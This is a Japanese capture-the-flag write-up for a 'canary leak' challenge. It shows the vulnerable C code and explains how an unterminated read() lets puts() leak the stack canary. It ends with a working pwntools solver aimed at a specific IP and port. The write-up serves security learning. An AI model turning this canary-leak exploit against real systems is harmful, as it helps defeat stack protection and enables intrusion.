# canary leak

## 問題

stack smashingっていつ検出されるんだろう？ ꜀(^｡｡^꜀ )꜆੭

```c
void vuln(){
    unsigned long *canary;
    unsigned long canary_saved;
    unsigned long input;
    char buf[64];

    canary = (unsigned long *)(buf + 0xc8);
    canary_saved = *canary;

    puts("Input:");
    read(0, buf, 0xcf);
    
    puts("Output:");
    puts(buf);

    puts("Canary?");
    read(0, &input, 8);

    if(canary_saved == input){
        FILE *fp = fopen("flag.txt","r");
            char flag[128];
            fgets(flag, sizeof(flag), fp);
            puts(flag);
    }else{
        puts("Nope");
    }
}
```

## 概要

vuln関数の中では、下記のような処理が行われます。

* bufより0xc8(=200)バイト上位のアドレスをcanaryに格納する。
* canaryの場所から符号なし整数とみなして取得しcanary_savedに格納する。
* bufに標準入力からreadで入力する。
* bufの内容を出力する。
* inputに標準入力からreadで入力する。
* canary_savedとinputが等しければフラグゲット。

入力できるところが２か所あります。何を入力すればフラグをゲットできるでしょうか？

２回目の入力でスタックカナリアの値を当てないといけないようですが・・・。

## 方針

bufをあふれさせてスタックカナリアの領域とくっつけ、Output:でbufを出力するときに一緒に出力させる。

## 解法

こんなのは簡単です。だてに毎日Daily AlpacaHackに取り組んでいませんからね。

canary_savedはbufより72バイト上位に配置されるのですから、
```
Input: 80文字の"a"
Canary? 8文字の"a"
```
を入力してcanarry_savedを上書きすればいいのでしょう？今回は楽勝でしたね。
```sh
$ nc 34.170.146.252 53934
Input:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Output:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Canary?
aaaaaaaa
Nope
```
あれ？ダメですね。

調査したところ、bufよりcanary_savedの方が下位に配置されるようです。（理由はわかりませんが。）
```c
    printf("%p\n", buf);
    printf("%p (%d)\n", &input, (int)((char *)(&input)-(uintptr_t)buf));
    printf("%p (%d)\n", &canary_saved, (int)((char *)(&canary_saved)-(uintptr_t)buf));
    printf("%p (%d)\n", &canary, (int)((char *)(&canary)-(uintptr_t)buf));
```
```
0x7ffe2354a9c0
0x7ffe2354a9b0 (-16)
0x7ffe2354a9a8 (-24)
0x7ffe2354a9a0 (-32)
```

・・・楽勝とか言ってすみませんでした。マジメにやります。

read関数はscanfやgetsとちがって最後にNULLバイトを打ち込みません。

その代わり入力の最後に改行がある場合はその改行は打ち込まれます。

`read(0, buf, 0xcf);`は0xcf(=207)バイトまで入力することができます。

例えば、
```
Input: 199文字の"a"
```
とすると、
```
[0]  [1]  ... [198] [199] [200] [201] ... [207]
0x61 0x61 ... 0x61  0x0a  <-  ここを知りたい  ->
```
のようになります。

しかし、スタックカナリアの最下位バイトは必ず`0x00`なので、これでは`puts(buf);`のときにその`0x00`で止まってしまいます。

よって、
```
Input: 200文字の"a"
```
として、
```
[0]  [1]  ... [198] [199] [200] [201] ... [207]
0x61 0x61 ... 0x61  0x61  0x0aここを知りたい  ->
```
のように0x00のところまで0x0a(LF)で書き換える必要があります。

こうすると、`puts(buf);`によって、入力した文字列だけでなくスタックカナリアの部分まで出力してくれるので、あとは、
```
Canary? "\x00" + Outputの[201]～[207]
```

のように入力すればオッケーです。

ただ、手入力では難しそうなので、Pythonのpwntoolsを使って解きました。

## ソルバー

```py
import pwn

#HOST, PORT = 'localhost', 9999
HOST, PORT = '34.170.146.252', 53934
p = pwn.remote(HOST, PORT)

p.recvuntil(b'Input:\n')
p.sendline(b'a' * 200)

d = p.recvuntil(b'Canary?\n')
b = b'\x00' + d[209:216] # "Output:\n"の分だけずれる
p.sendline(b)

print(p.recvall().decode())
```
